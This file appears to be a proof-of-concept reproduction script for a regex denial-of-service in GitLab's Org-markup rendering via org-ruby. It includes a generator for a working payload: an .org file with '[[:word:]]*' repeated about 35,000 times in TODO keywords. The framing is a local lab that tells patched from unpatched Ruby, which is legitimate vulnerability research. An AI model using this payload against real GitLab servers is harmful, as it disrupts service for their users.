# Lightweight local lab: reproduces the GitLab OtherMarkup Org-render path
# without needing a full GitLab instance (which needs ~9 GB RAM + GBs of images).
#
# Mimics: Gitlab::OtherMarkup render with a Timeout budget (like GitLab's
# markup renderer) -> Orgmode::Parser (org-ruby 0.9.12) -> Headline#parse_keywords
# -> Regexp.new("^#{keyword}\\s*") with attacker-controlled keyword.
#
# Usage:
#   gem install org-ruby -v 0.9.12
#   ruby repro.rb [payload.org] [--budget 8]
#   ruby repro.rb --generate 35000 p0.org   # generate payload then render it
#
# Expected on vulnerable Ruby (unpatched Onigmo, e.g. 3.3.x/3.4.x before Oct-2026 patch):
#   Timeout::Error (execution expired) for repeats >= ~20000 (GitLab budget),
#   quadratic compile blowup, and repeat-ID wrap past 32767.
# Expected on patched Ruby (repeat-ID overflow patch + MAX_COMPILED_PROGRAM_SIZE):
#   fast RegexpError / quick reject instead of multi-second compile.

require 'timeout'
require 'benchmark'

BUDGET = (ARGV.include?('--budget') ? ARGV[ARGV.index('--budget') + 1].to_i : 8)

def render_file(path, budget)
  require 'org-ruby'
  org = File.read(path)
  puts "[*] file=#{path} bytes=#{org.size} budget=#{budget}s"
  t = Benchmark.realtime do
    begin
      Timeout.timeout(budget) do
        parser = Orgmode::Parser.new(org)
        html = parser.to_html
        puts "[*] rendered OK html=#{html.length} (patched/fast or small payload)"
      end
    rescue Timeout::Error
      puts "[VULN] Timeout::Error (execution expired) -- markup budget exceeded."
      puts "       Same signal GitLab logs as exceptions_json.log OtherMarkup/.org burst."
      exit 0
    rescue RegexpError => e
      puts "[?] RegexpError (fast reject, patched-style?): #{e.message[0, 120]}"
      exit 1
    end
  end
  puts "[*] time=#{t.round(2)}s"
end

if ARGV.include?('--generate')
  n = ARGV[ARGV.index('--generate') + 1].to_i
  out = ARGV[ARGV.index('--generate') + 2] || 'p0.org'
  unit = '[[:word:]]*'
  kw = unit * n
  File.write(out, "#+TODO: #{kw}\n#+SEQ_TODO: #{kw}\n#+TYP_TODO: #{kw}\n* #{kw} hello\n")
  puts "[*] wrote #{out} (#{File.size(out)} bytes, #{n} repeats, kw=#{kw.length} chars)"
  puts "    crosses 32767 repeat-ID limit: #{n > 32767}"
  exit 0
end

path = ARGV.find { |a| a.end_with?('.org') } || 'p0.org'
unless File.exist?(path)
  puts "[!] #{path} not found. Generate one:"
  puts "    ruby repro.rb --generate 35000 p0.org"
  exit 2
end
render_file(path, BUDGET)
